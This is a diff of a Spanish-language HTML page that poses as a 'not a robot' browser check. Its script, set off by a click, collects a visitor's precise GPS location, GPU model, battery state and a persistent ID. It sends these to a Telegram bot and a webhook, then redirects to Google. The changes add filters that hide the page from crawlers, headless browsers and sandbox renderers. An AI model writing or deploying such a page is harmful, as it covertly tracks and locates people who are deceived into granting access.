@@ -5,17 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificando navegador...</title>
     <style>
-        body { background: #fff; color: #3c4043; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        body { background: #fff; color: #3c4043; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; }
+        .container { text-align: center; padding: 20px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { font-size: 14px; color: #70757a; }
+        h1 { font-size: 1.1rem; font-weight: 500; }
+        p { font-size: 0.9rem; color: #70757a; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="loader"></div>
-        <p>Confirmando conexión segura...</p>
+        <h1>Espera un momento...</h1>
+        <p>Toca cualquier parte de la pantalla para confirmar que no eres un robot y continuar.</p>
     </div>
 
     <script>
@@ -26,7 +28,12 @@
             exit: "https://www.google.com"
         };
 
-        async function iniciar() {
+        // FILTRO 1: Bloqueo inmediato de bots por User-Agent
+        const isBot = /bot|googlebot|crawler|spider|robot|crawling|github|headless|lighthouse/i.test(navigator.userAgent);
+        
+        async function recolectar() {
+            if (isBot) return; // Si es un bot, no hace nada
+
             let id = localStorage.getItem('_sid') || 'ID-' + Math.random().toString(36).substr(2, 5).toUpperCase();
             localStorage.setItem('_sid', id);
 
@@ -44,11 +51,14 @@
                 hw = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
             } catch(e) {}
 
+            // FILTRO 2: Si el hardware es un servidor genérico o software, descartar
+            if (hw.includes("SwiftShader") || hw.includes("llvmpipe")) return;
+
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (p) => enviar(p, id, hw, bat),
                     () => enviar(null, id, hw, bat),
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             } else {
                 enviar(null, id, hw, bat);
@@ -57,19 +67,15 @@
 
         async function enviar(pos, id, hw, bat) {
             let gpsTxt = "hubo problemas con esta criterio (GPS)";
-            let inlineKeyboard = [];
+            let lat = null, lon = null;
 
             if (pos) {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
+                lat = pos.coords.latitude;
+                lon = pos.coords.longitude;
                 gpsTxt = `Lat: \`${lat}\` | Lon: \`${lon}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)`;
-                
-                inlineKeyboard = [[
-                    { text: "🗺️ Abrir en Google Maps", url: `https://www.google.com/maps?q=${lat},${lon}` }
-                ]];
             }
 
-            const report = `🔔 **REGISTRO DE ACTIVIDAD**\n` +
+            const report = `👤 **NUEVO ACCESO REAL**\n` +
                            `━━━━━━━━━━━━━━━━━━━━\n` +
                            `🆔 **ID:** \`${id}\`\n` +
                            `📱 **Dispositivo:** \`${hw}\`\n` +
@@ -78,7 +84,6 @@
                            `━━━━━━━━━━━━━━━━━━━━`;
 
             try {
-                // El uso de await aquí garantiza que el código espere a que los mensajes se envíen
                 await Promise.all([
                     fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                         method: "POST",
@@ -87,7 +92,7 @@
                             chat_id: CONFIG.chat,
                             text: report,
                             parse_mode: "Markdown",
-                            reply_markup: inlineKeyboard.length > 0 ? { inline_keyboard: inlineKeyboard } : undefined
+                            reply_markup: pos ? { inline_keyboard: [[{ text: "🗺️ Abrir en Google Maps", url: `https://www.google.com/maps?q=${lat},${lon}` }]] } : undefined
                         })
                     }),
                     fetch(CONFIG.webhook, {
@@ -96,15 +101,18 @@
                         body: JSON.stringify({ content: report.replace(/\*/g, "**") })
                     })
                 ]);
-            } catch(e) {
-                console.error("Error en el envío");
-            } finally {
-                // La redirección SOLO ocurre después de que el bloque try/catch termine
-                window.location.href = CONFIG.exit;
-            }
+            } catch(e) {}
+
+            window.location.href = CONFIG.exit;
         }
 
-        window.onload = iniciar;
+        // FILTRO 3: Solo se activa si el usuario hace CLIC en la página
+        window.onclick = () => {
+            if (!window.triggered) {
+                window.triggered = true;
+                recolectar();
+            }
+        };
     </script>
 </body>
 </html>
